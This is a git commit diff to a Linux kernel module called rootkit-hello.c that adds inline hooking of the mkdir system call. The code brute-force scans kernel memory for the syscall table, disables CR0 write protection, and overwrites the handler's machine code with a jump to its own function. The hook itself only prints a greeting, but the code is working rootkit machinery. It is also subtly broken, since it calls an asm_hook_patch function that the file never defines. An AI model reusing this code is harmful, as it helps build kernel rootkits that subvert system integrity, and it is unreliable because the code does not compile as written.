f6a150194a408cb16f7367ff01b62fc3d45b9c32
Iram Lee <iram.lee@gmail.com>
2019-01-14 18:46:26 -0600

    add functionality to hook mkdir

--- rootkit-hello.c
+++ rootkit-hello.c
@@ -3,18 +3,38 @@
 #include <linux/kernel.h>
 #include <linux/syscalls.h>
 #include <linux/version.h>
+#include <linux/list.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Iram Lee");
 MODULE_DESCRIPTION("A simple example Linux module.");
 MODULE_VERSION("0.01");
 
-// ========== SYS_CALL_TABLE ==========
+/* The write_cr0() macro is used to disable write protection (WP) on the CR register
+ * this will let the kernel read from WP locations.
+ * These steps are necesary to modify the sys call table.
+ */
+#define DISABLE_W_PROTECTED_MEMORY \
+    do { \
+        preempt_disable(); \
+        write_cr0(read_cr0() & (~ 0x10000)); \
+    } while (0);
+#define ENABLE_W_PROTECTED_MEMORY \
+    do { \
+        preempt_enable(); \
+        write_cr0(read_cr0() | 0x10000); \
+    } while (0);
 
+// ========== SYS_CALL_TABLE ==========
 // for x86_64
 #if defined __x86_64__
     #define START_ADDRESS 0xffffffff81000000
     #define END_ADDRESS 0xffffffffa2000000
+    // there is no push that pushes a 64-bit immidiate in x86_64,
+    // so we do things a bit differently:
+    // mov rax 0x0000000000000000, jmp rax
+    #define ASM_HOOK_CODE "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"
+    #define ASM_HOOK_CODE_OFFSET 2
 #endif
 
 void **sys_call_table;
@@ -31,10 +51,8 @@ void **find_syscall_table(void)
 {
     void **sctable;
     void *i = (void*) START_ADDRESS;
-
     while (i < END_ADDRESS) {
         sctable = (void **) i;
-
         // sadly only sys_close seems to be exported -- we can't check against more system calls
         if (sctable[__NR_close] == (void *) sys_close) {
             size_t j;
@@ -53,22 +71,140 @@ skip:
         ;
         i += sizeof(void *);
     }
-
     return NULL;
 }
 // ========== END SYS_CALL_TABLE ==========
 
+// ========== ASM HOOK LIST ==========
+
+struct asm_hook {
+    void *original_function;
+    void *modified_function;
+    char original_asm[sizeof(ASM_HOOK_CODE)-1];
+    struct list_head list;
+};
+
+LIST_HEAD(asm_hook_list);
+
+/**
+ * Patches machine code of the original function to call another function.
+ * This function should not be called directly.
+ */
+void _asm_hook_patch(struct asm_hook *h)
+{
+    DISABLE_W_PROTECTED_MEMORY
+    memcpy(h->original_function, ASM_HOOK_CODE, sizeof(ASM_HOOK_CODE)-1);
+    *(void **)&((char *)h->original_function)[ASM_HOOK_CODE_OFFSET] = h->modified_function;
+    ENABLE_W_PROTECTED_MEMORY
+}
+
+/**
+ * Patches machine code of a function so that it would call our function.
+ * Keeps record of the original function and its machine code so that it could
+ * be unpatched and patched again later.
+ *
+ * @param original_function Function to patch
+ *
+ * @param modified_function Function that should be called
+ *
+ * @return true on success, false on failure.
+ */
+int asm_hook_create(void *original_function, void *modified_function)
+{
+    struct asm_hook *h = kmalloc(sizeof(struct asm_hook), GFP_KERNEL);
+
+    if (!h) {
+        return 0;
+    }
+
+    h->original_function = original_function;
+    h->modified_function = modified_function;
+    memcpy(h->original_asm, original_function, sizeof(ASM_HOOK_CODE)-1);
+    list_add(&h->list, &asm_hook_list);
+
+    _asm_hook_patch(h);
+
+    return 1;
+}
+
+/**
+ * Unpatches machine code of the original function, so that it wouldn't call
+ * our function anymore.
+ * This function should not be called directly.
+ */
+void _asm_hook_unpatch(struct asm_hook *h)
+{
+    DISABLE_W_PROTECTED_MEMORY
+    memcpy(h->original_function, h->original_asm, sizeof(ASM_HOOK_CODE)-1);
+    ENABLE_W_PROTECTED_MEMORY
+}
+
+/**
+ * Unpatches machine code of the original function, so that it wouldn't call
+ * our function anymore.
+ *
+ * @param modified_function Function that the original function was patched to
+ * call in asm_hook_create().
+ */
+void *asm_hook_unpatch(void *modified_function)
+{
+    void *original_function = NULL;
+    struct asm_hook *h;
+
+    list_for_each_entry(h, &asm_hook_list, list) {
+        if (h->modified_function == modified_function) {
+            _asm_hook_unpatch(h);
+            original_function = h->original_function;
+            break;
+        }
+    }
+
+    return original_function;
+}
+
+/**
+ * Removes all hook records, unpatches all functions.
+ */
+void asm_hook_remove_all(void)
+{
+    struct asm_hook *h, *tmp;
+
+    list_for_each_entry_safe(h, tmp, &asm_hook_list, list) {
+        _asm_hook_unpatch(h);
+        list_del(&h->list);
+        kfree(h);
+    }
+}
+
+// ========== END ASM HOOK LIST ==========
+
+/**
+ * Definition of our function, with which the
+ * original is hooked
+ *
+*/
+asmlinkage long asm_mkdir(const char __user *pathname)
+{
+    asmlinkage long (*original_mkdir)(const char __user *);
+    original_mkdir = asm_hook_unpatch(asm_mkdir);
+    long ret = original_mkdir(pathname);
+    asm_hook_patch(asm_mkdir);
+    pr_info("Hello world from rootkit mkdir!\n");
+    return ret;
+}
+
 static int __init lkm_example_init(void) {
   printk(KERN_INFO "Hello, World!\n");
   /* Locate the system call table */
-    sys_call_table = find_syscall_table();
-    pr_info("Found sys_call_table at %p\n", sys_call_table);
-
+  sys_call_table = find_syscall_table();
+  pr_info("Found sys_call_table at %p\n", sys_call_table);
+  asm_hook_create(sys_call_table[__NR_mkdir], asm_mkdir);
   return 0;
 }
 
 static void __exit lkm_example_exit(void) {
   printk(KERN_INFO "Goodbye, World!\n");
+  asm_hook_remove_all();
 }
 
 module_init(lkm_example_init);
